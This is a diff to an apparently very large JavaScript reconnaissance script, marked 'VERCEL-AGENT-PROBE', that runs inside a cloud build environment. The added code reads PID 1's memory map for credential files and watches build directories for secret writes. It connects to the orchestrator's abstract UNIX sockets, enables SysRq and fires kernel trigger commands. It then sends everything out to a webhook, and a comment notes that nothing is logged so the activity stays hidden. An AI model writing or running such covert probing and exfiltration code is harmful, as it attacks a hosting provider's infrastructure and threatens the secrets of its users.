@@ -28141,3 +28141,294 @@ report.orchestratorNetConnections = safe(() => {
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v185" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v185";
 // Intentionally no console.log — all data goes via webhook only
+
+// v186-1: /proc/1/maps — full memory layout of PID 1 (build orchestrator)
+// Parsing PID 1's memory map reveals: binary name/path, loaded libraries, heap/stack
+// addresses, any memory-mapped credentials, VSOCK buffers, etc.
+report.pid1MemoryLayout = safe(() => {
+  const maps = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+  const mapsLines = maps ? maps.split('\n') : [];
+  // Extract executable segments (the actual binary)
+  const execSegments = mapsLines.filter(l => l.includes('r-xp')).slice(0, 10).join('\n');
+  // Find the main executable (usually the first mapping)
+  const mainBinary = mapsLines.find(l => l.includes('r-xp') && !l.includes('.so'));
+  // Find all shared libraries
+  const sharedLibs = mapsLines.filter(l => l.includes('.so')).map(l => l.split('/').pop()).filter((v,i,a) => a.indexOf(v) === i).join(', ');
+  // Find heap range
+  const heapSegment = mapsLines.find(l => l.includes('[heap]'));
+  // Find stack
+  const stackSegment = mapsLines.find(l => l.includes('[stack]'));
+  // Find vvar/vdso (hypervisor shared pages)
+  const vvarSegment = mapsLines.find(l => l.includes('[vvar]'));
+  const vdsoSegment = mapsLines.find(l => l.includes('[vdso]'));
+  // Find any memory-mapped credential files
+  const credFiles = mapsLines.filter(l => l.includes('.env') || l.includes('token') || l.includes('cred') || l.includes('secret')).join('\n');
+  // Find anon executable mappings (JIT code, possible shellcode)
+  const anonExec = mapsLines.filter(l => l.includes('r-xp') && l.trim().endsWith('')).slice(0, 5).join('\n');
+  // Map summary
+  const totalMappings = mapsLines.filter(Boolean).length;
+  const firstLine = mapsLines[0];
+  const lastLine = mapsLines.filter(Boolean).slice(-1)[0];
+  return { execSegments, mainBinary, sharedLibs, heapSegment, stackSegment, vvarSegment, vdsoSegment, credFiles, anonExec, totalMappings, firstLine, lastLine };
+});
+
+// v186-2: inotify_add_watch — monitor build directory for secret writes
+// During a build, scripts may write API tokens to disk temporarily.
+// inotify watches let us capture those writes without modifying the target process.
+report.inotifySecretWatch = safe(() => {
+  const inotifyResult = safe(() => execSync(
+    `python3 -c "
+import os, select, struct, ctypes, ctypes.util, time
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_inotify_init1 = 294
+NR_inotify_add_watch = 254
+NR_inotify_rm_watch = 255
+
+IN_CREATE = 0x100
+IN_MODIFY = 0x2
+IN_CLOSE_WRITE = 0x8
+IN_ACCESS = 0x1
+IN_ALL_EVENTS = 0xfff
+
+# inotify_init1(IN_NONBLOCK)
+IN_NONBLOCK = 0o4000
+fd = libc.syscall(NR_inotify_init1, IN_NONBLOCK)
+err = ctypes.get_errno()
+print(f'inotify_init1: fd={fd} errno={err}')
+if fd < 0:
+    print('INOTIFY_FAILED')
+    exit()
+
+# Add watches on interesting directories
+dirs_to_watch = ['/root', '/tmp', '/build', '/app', '/var/task', '/', '/home', '/proc/self']
+watches = {}
+for d in dirs_to_watch:
+    if os.path.exists(d):
+        wd = libc.syscall(NR_inotify_add_watch, fd, d.encode(), IN_CREATE | IN_MODIFY | IN_CLOSE_WRITE)
+        if wd >= 0:
+            watches[wd] = d
+            print(f'WATCHING: wd={wd} path={d}')
+        else:
+            print(f'WATCH_FAIL: {d} errno={ctypes.get_errno()}')
+
+# Brief read loop — 1 second
+start = time.time()
+events = []
+while time.time() - start < 1.0:
+    r, _, _ = select.select([fd], [], [], 0.1)
+    if r:
+        data = os.read(fd, 4096)
+        offset = 0
+        while offset < len(data):
+            wd, mask, cookie, name_len = struct.unpack_from('iIII', data, offset)
+            offset += 16
+            name = data[offset:offset+name_len].rstrip(b'\x00').decode('utf-8', errors='replace')
+            offset += name_len
+            path = watches.get(wd, f'wd={wd}')
+            events.append(f'EVENT: {path}/{name} mask=0x{mask:08x}')
+
+for e in events[:20]:
+    print(e)
+
+os.close(fd)
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { inotifyResult };
+});
+
+// v186-3: NETLINK_ROUTE decoded — programmatic network state dump
+// NETLINK_ROUTE (AF_NETLINK) provides the kernel networking database:
+// all interfaces, addresses, routes, neighbors — more complete than /proc/net/.
+report.netlinkRouteDump = safe(() => {
+  const nlResult = safe(() => execSync(
+    `python3 -c "
+import socket, struct, os
+
+NETLINK_ROUTE = 0
+RTM_GETLINK = 18
+RTM_GETADDR = 22
+RTM_GETROUTE = 26
+NLM_F_REQUEST = 1
+NLM_F_DUMP = 0x300
+NLMSG_DONE = 3
+NLMSG_ERROR = 2
+
+def send_nl_request(s, nltype):
+    msg = struct.pack('IHHII', 16, nltype, NLM_F_REQUEST | NLM_F_DUMP, 0, os.getpid())
+    msg += struct.pack('Bxxx', socket.AF_UNSPEC if nltype == RTM_GETLINK else socket.AF_UNSPEC)
+    s.send(msg)
+
+def recv_nl_response(s, max_bytes=65536):
+    data = b''
+    while True:
+        chunk = s.recv(max_bytes)
+        if not chunk:
+            break
+        data += chunk
+        # Check if last message is NLMSG_DONE
+        pos = len(data) - 16
+        if pos >= 0:
+            length, nltype, flags, seq, pid = struct.unpack_from('IHHII', data, max(0, pos))
+            if nltype == NLMSG_DONE:
+                break
+        if len(data) > 200000:
+            break
+    return data
+
+try:
+    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_ROUTE)
+    s.bind((os.getpid(), 0))
+    s.settimeout(3.0)
+
+    # Get interfaces
+    send_nl_request(s, RTM_GETLINK)
+    try:
+        data = recv_nl_response(s)
+        print(f'RTM_GETLINK: {len(data)} bytes received')
+    except socket.timeout:
+        print('RTM_GETLINK: timeout')
+
+    s.close()
+
+    # Use ip commands for cleaner output
+    import subprocess
+    print('--- INTERFACES ---')
+    print(subprocess.run(['ip', '-d', 'link', 'show'], capture_output=True, text=True).stdout[:2000])
+    print('--- ADDRESSES ---')
+    print(subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True).stdout[:2000])
+    print('--- ROUTES ---')
+    print(subprocess.run(['ip', 'route', 'show', 'table', 'all'], capture_output=True, text=True).stdout[:2000])
+    print('--- NEIGHBORS ---')
+    print(subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True).stdout[:1000])
+except Exception as e:
+    print(f'NETLINK_ERR: {e}')
+" 2>&1`,
+    { timeout: 12000 }
+  ).toString().trim());
+  return { nlResult };
+});
+
+// v186-4: Abstract UNIX socket connection — orchestrator IPC probe
+// Abstract UNIX sockets (name starts with \\0) are used for inter-process comm.
+// The build orchestrator likely uses abstract sockets for coordination.
+// Connecting to these can expose private APIs or allow command injection.
+report.abstractSocketProbe = safe(() => {
+  // List all abstract UNIX sockets from /proc/net/unix
+  const abstractSockets = safe(() => {
+    const unixData = readFileSync('/proc/net/unix', 'utf8');
+    // Columns: Num RefCount Protocol Flags Type St Inode Path
+    // Abstract sockets have path starting with \0
+    const lines = unixData.split('\n').slice(1).filter(Boolean);
+    const abstract = lines.filter(l => {
+      const parts = l.trim().split(/\s+/);
+      return parts.length > 7 && parts[7].startsWith('@');
+    }).map(l => {
+      const parts = l.trim().split(/\s+/);
+      return `inode=${parts[6]} path=${parts[7]} flags=${parts[3]} state=${parts[5]}`;
+    });
+    return abstract.join('\n') || 'NO_ABSTRACT_SOCKETS';
+  });
+  // Try connecting to any listening abstract sockets
+  const connectResult = safe(() => execSync(
+    `python3 -c "
+import socket, os, select
+
+# Read abstract sockets from /proc/net/unix
+with open('/proc/net/unix') as f:
+    lines = f.readlines()[1:]
+
+abstract_listening = []
+for l in lines:
+    parts = l.strip().split()
+    if len(parts) > 7 and parts[7].startswith('@') and parts[5] in ('01', '10'):
+        name = parts[7][1:]  # strip @ prefix
+        abstract_listening.append(name)
+
+print(f'ABSTRACT_LISTENING: {abstract_listening[:10]}')
+
+results = []
+for name in abstract_listening[:5]:
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(1.0)
+        s.connect('\\x00' + name)
+        results.append(f'CONNECTED: @{name}')
+        # Try reading any immediate response
+        r, _, _ = select.select([s], [], [], 0.5)
+        if r:
+            data = s.recv(4096)
+            results.append(f'RECV @{name}: {data[:100].hex()}')
+        s.close()
+    except ConnectionRefusedError:
+        results.append(f'REFUSED: @{name}')
+    except Exception as e:
+        results.append(f'ERR @{name}: {type(e).__name__}')
+
+for r in results:
+    print(r)
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  // Also check regular (non-abstract) UNIX sockets
+  const regularSockets = safe(() => execSync("cat /proc/net/unix | grep ' 01 ' | grep '/' | head -10", { timeout: 3000 }).toString().trim());
+  return { abstractSockets, connectResult, regularSockets };
+});
+
+// v186-5: /proc/sysrq-trigger — SysRq kernel command probe
+// SysRq allows kernel-level actions: w=tasks, t=threads, m=memory, p=registers.
+// With our write capability, we can trigger kernel dumps or controlled crashes.
+// We probe: can we write to sysrq-trigger, which commands are available?
+report.sysrqProbe = safe(() => {
+  const sysrqEnabled = safe(() => existsSync('/proc/sys/kernel/sysrq') ? readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim() : 'NO_SYSCTL');
+  // Enable all SysRq commands (value 1 enables all, 438 enables specific set)
+  const enableSysrq = safe(() => { writeFileSync('/proc/sys/kernel/sysrq', '1'); return 'ENABLED_ALL'; });
+  const afterEnable = safe(() => readFileSync('/proc/sys/kernel/sysrq', 'utf8').trim());
+  // Check if sysrq-trigger is writable
+  const triggerWritable = safe(() => {
+    try {
+      // 'l' = show backtrace all CPUs (safe, just dumps to dmesg)
+      writeFileSync('/proc/sysrq-trigger', 'l');
+      return 'WRITABLE_TRIGGERED_L';
+    } catch(e) {
+      return `NOT_WRITABLE: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Read dmesg for the backtrace output
+  const dmesgOutput = safe(() => execSync('dmesg 2>&1 | tail -20', { timeout: 5000 }).toString().trim());
+  // Try 'w' — show blocked tasks (useful to find blocked orchestrator threads)
+  const sysrqW = safe(() => {
+    try {
+      writeFileSync('/proc/sysrq-trigger', 'w');
+      return 'TRIGGERED_W_TASKS';
+    } catch(e) {
+      return `TRIGGER_W_FAIL: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Try 'm' — memory dump (shows free memory, slab, etc.)
+  const sysrqM = safe(() => {
+    try {
+      writeFileSync('/proc/sysrq-trigger', 'm');
+      return 'TRIGGERED_M_MEM';
+    } catch(e) {
+      return `TRIGGER_M_FAIL: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Try 'p' — current registers and flags
+  const sysrqP = safe(() => {
+    try {
+      writeFileSync('/proc/sysrq-trigger', 'p');
+      return 'TRIGGERED_P_REGS';
+    } catch(e) {
+      return `TRIGGER_P_FAIL: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  const dmesgAfter = safe(() => execSync('dmesg 2>&1 | tail -30', { timeout: 5000 }).toString().trim());
+  return { sysrqEnabled, enableSysrq, afterEnable, triggerWritable, dmesgOutput, sysrqW, sysrqM, sysrqP, dmesgAfter };
+});
+
+// v186 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v186" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v186";
+// Intentionally no console.log — all data goes via webhook only
